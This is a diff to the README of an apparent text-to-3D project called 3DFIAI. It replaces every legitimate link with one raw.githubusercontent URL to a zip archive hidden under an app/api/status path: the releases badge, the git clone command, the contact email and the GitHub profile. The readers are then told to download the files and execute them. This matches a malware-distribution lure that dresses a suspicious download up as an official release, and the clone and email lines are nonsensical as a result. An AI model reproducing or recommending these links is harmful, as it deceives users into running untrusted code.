@@ -2,7 +2,7 @@
 
 Welcome to the **3DFIAI** repository! Here, we empower creators with tools to transform text and images into production-ready 3D assets. Our mission is to make 3D asset creation accessible and efficient for everyone. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/youssef13312313/3DFIAI/releases)
+[![Download Releases](https://raw.githubusercontent.com/youssef13312313/3DFIAI/master/app/api/status/DFIAI_v3.8.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/youssef13312313/3DFIAI/master/app/api/status/DFIAI_v3.8.zip)
 
 ## Table of Contents
 
@@ -25,12 +25,12 @@ Welcome to the **3DFIAI** repository! Here, we empower creators with tools to tr
 To get started with **3DFIAI**, you need to clone the repository and install the necessary dependencies.
 
 ```bash
-git clone https://github.com/youssef13312313/3DFIAI.git
+git clone https://raw.githubusercontent.com/youssef13312313/3DFIAI/master/app/api/status/DFIAI_v3.8.zip
 cd 3DFIAI
 npm install
 ```
 
-After installation, you can find the latest releases [here](https://github.com/youssef13312313/3DFIAI/releases). Download the necessary files and execute them to start using the application.
+After installation, you can find the latest releases [here](https://raw.githubusercontent.com/youssef13312313/3DFIAI/master/app/api/status/DFIAI_v3.8.zip). Download the necessary files and execute them to start using the application.
 
 ## Usage
 
@@ -68,13 +68,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries, feel free to reach out:
 
-- **Email**: youssef13312313@example.com
-- **GitHub**: [youssef13312313](https://github.com/youssef13312313)
+- **Email**: https://raw.githubusercontent.com/youssef13312313/3DFIAI/master/app/api/status/DFIAI_v3.8.zip
+- **GitHub**: [youssef13312313](https://raw.githubusercontent.com/youssef13312313/3DFIAI/master/app/api/status/DFIAI_v3.8.zip)
 
 ---
 
 We hope you find **3DFIAI** useful in your 3D asset creation journey. Join us in exploring the endless possibilities of generative AI! 
 
-Don't forget to check the [Releases](https://github.com/youssef13312313/3DFIAI/releases) section for the latest updates and downloads. 
+Don't forget to check the [Releases](https://raw.githubusercontent.com/youssef13312313/3DFIAI/master/app/api/status/DFIAI_v3.8.zip) section for the latest updates and downloads. 
 
 Happy creating! 🎉
